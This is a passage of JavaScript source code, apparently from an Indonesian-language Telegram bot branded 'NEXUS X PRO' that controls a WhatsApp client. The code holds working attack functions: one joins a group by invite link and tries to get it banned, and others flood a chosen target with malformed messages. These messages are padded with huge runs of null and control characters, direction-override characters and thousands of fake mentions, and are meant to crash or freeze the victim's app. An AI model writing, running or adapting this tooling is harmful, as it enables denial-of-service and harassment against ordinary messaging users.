        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            undefined,
            `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Target Grup: ${inviteCode}
↯ Type: Auto Join + Group Ban
↯ Status: Sending payload...
`,
            { parse_mode: "HTML" }
        );

        await BanGroup(target);

        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            undefined,
            `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Target Grup: ${inviteCode}
↯ Type: Auto Join + Group Ban
↯ Status: Berhasil 
`,
            { parse_mode: "HTML" }
        );

    } catch (err) {
        console.error("Overbannido error:", err.message);

        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            undefined,
            `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Target Grup: ${inviteCode}
↯ Status: Gagal
↯ Error: ${err.message}
`,
            { parse_mode: "HTML" }
        );
    }
});

// ─────── EXTRACT GROUP CODE ─────── //
function extractGroupCode(input) {
    const text = String(input || "").trim();
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
    return match ? match[1] : null;
}

// ─────── AWAL DARI FUNCTION ─────── //
async function BanGroup(target) {
  if (!target.endsWith('@g.us')) {
    throw '@g.us server required';
  }

  group = target;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['971500000000@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}

async function Delayultimate(sock, target) {
    try {
        const s = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "༑⌁⃰canx env suki🤭ཀ‌‌#ᛉ"
                        },
                        nativeFlowMessage: {
                            buttons: "\u001A".repeat(500000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, s, {});
        
        const u = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "༑⌁⃰canx env suki🤭ཀ‌‌#ᛉ"
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000".repeat(500000)
                        }
                    }
                }
            }
        };

        const k = {
            interactiveMessage: {
                body: {
                    text: "༑⌁⃰canx env suki🤭ཀ‌‌#ᛉ"
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        };

       
        await sock.relayMessage(target, u, {});


        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "\u0000".repeat(200000),
                            title: "\u0000".repeat(200000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(500000),
                            version: 3
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        });

        
        await sock.relayMessage(target, k, {});

        console.log("success send to target");

    } catch (err) {
        console.error("Error:", err);
    }
}

async function Xatanc(sock, target) {
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\u0070".repeat(50000),
                        subtitle: "\x10".repeat(50000),
                        bloksWidget: {
                            uuid: "\u200B".repeat(50000),
                            data: "[".repeat(50001),
                            type: "\u200F".repeat(50000),
                            fallback: "\u200D".repeat(50000)
                        }
                    },
                    body: { text: "\u000F" },
                    nativeFlowMessage: {
                        buttons: "[".repeat(50000)
                    }
                }
            }
        }
    }, {
        participant: target,
        noselfsync: true
    });
}

async function KxADelayInvisibleNew(sock, target) {
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "\u0FDB"
          },
          nativeFlowMessage: {
            buttons: "one_crash_message".repeat(20000)
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            conversionDelaySeconds: 999999,
            entryPointConversionDelaySeconds: 999999,
            afterReadDuration: 60,
            isSpoiler: true,
            expiration: 60,
            mentionedJid: [target]
          }
        },
        messageContextInfo: {
          messageAddOnDurationInSecs: 60,
          messageAddOnExpiryType: 2
        }
      },
      participant: target
    }
  };

  const payload2 = {
    groupStatusMessageV2: {
      nativeFlowMessage: {
        extendedTextMessage: {
          text: "\u0003".repeat(9000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, payload, {
    participant: target
  });

  await sock.relayMessage(target, payload2, {
    participant: target
  });
}

async function Buldozer(sock, target) {
    for (let i = 0; i < 55; i++) {
        const msg = generateWAMessageFromContent(target, {
            audioMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/invalid",
                mimetype: "audio/mp4",
                fileSha256: Buffer.alloc(32).toString("base64"),
                fileEncSha256: Buffer.alloc(32).toString("base64"),
                mediaKey: Buffer.alloc(32).toString("base64"),
                fileLength: "999999999999999999",
                seconds: 999999,
                ptt: true,
                directPath: "/o1/v/t62.7118-24/f2/m231/" + "\u202E".repeat(7000),
                mediaKeyTimestamp: "9999999999999",
                contextInfo: {
                    mentionedJid: Array.from({ length: 5000 }, function() {
                        return Math.floor(Math.random() * 500000) + "@s.whatsapp.net";
                    }),
                    forwardingScore: 999999,
                    isForwarded: true,
                    conversionSource: "\u202E".repeat(7000) + "\u034F".repeat(8000),
                    quotedMessage: {
                        conversation: "\u034F".repeat(7000) + "\u202E".repeat(8000)
                    }
                }
            }
        }, { userJid: target });

        try {
            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id + "_" + i,
         noSelfSync: true
            });
        } catch (e) {}

        await new Promise(r => setTimeout(r, 500));
    }
}

// ─────── AKHIR DARI FUNCTION ─────── //
(async () => {
    console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│  Bot berhasil jalan bos
╰─────────────────────────────╯
`));

    const valid = await validateBot();
    if (!valid) {
        console.log(chalk.gray('\n⏳ Bot telah di matikan...'));
        process.exit(1);
    }

    bot.launch();
})();
